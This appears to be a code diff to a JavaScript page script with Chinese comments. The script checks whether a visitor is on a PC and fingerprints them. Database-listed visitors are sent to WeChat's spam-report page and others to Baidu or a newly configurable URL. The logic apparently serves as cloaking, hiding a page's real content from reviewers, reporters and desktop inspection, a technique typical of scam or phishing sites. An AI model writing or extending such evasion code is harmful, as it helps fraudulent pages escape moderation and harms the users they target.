@@ -59,16 +59,16 @@ function detectDevice() {
 /**
  * 执行PC端重定向
  * @param {boolean} isKnown - 是否为已知用户
+ * @param {string} redirectUrl - 自定义重定向URL
  */
-function redirectPC(isKnown) {
+function redirectPC(isKnown, redirectUrl) {
     if (isKnown) {
         // 数据库用户 → 微信举报页面
-        // 数据库用户重定向到微信举报页面
         window.location.href = "https://weixin110.qq.com/cgi-bin/mmspamsupport-bin/newredirectconfirmcgi?main_type=2&evil_type=0&source=2";
     } else {
-        // 正常访客 → 百度页面
-        // 正常访客重定向到百度页面
-        window.location.href = "https://m.baidu.com";
+        // 正常访客 → 使用配置的重定向地址或默认地址
+        var targetUrl = redirectUrl || "https://www.baidu.com";
+        window.location.href = targetUrl;
     }
 }
 
@@ -78,6 +78,7 @@ function redirectPC(isKnown) {
  * @param {string} config.ff_pc - PC端检测开关 ('0'=关闭, '1'=开启)
  * @param {string} config.f - 用户链接参数
  * @param {string} config.fingerprint - 设备指纹
+ * @param {string} config.redirectUrl - 自定义重定向URL
  * @param {boolean} config.debug - 是否开启调试模式
  */
 function initPCDetection(config) {
@@ -90,10 +91,12 @@ function initPCDetection(config) {
     var ff_pc = config.ff_pc || '0';
     var f = config.f || '';
     var fingerprint = config.fingerprint || '';
+    var redirectUrl = config.redirectUrl || '';
 
     // 首先检查是否启用PC端检测
     if (ff_pc !== '1') {
         // PC端检测已关闭，直接返回，不执行任何检测逻辑
+        console.log('[PC检测] PC端检测已关闭，允许访问');
         return;
     }
 
@@ -114,7 +117,7 @@ function initPCDetection(config) {
 
         // 添加延迟，避免过于激进的重定向
         setTimeout(function() {
-            redirectPC(isKnown);
+            redirectPC(isKnown, redirectUrl);
         }, 500);
     }
 }
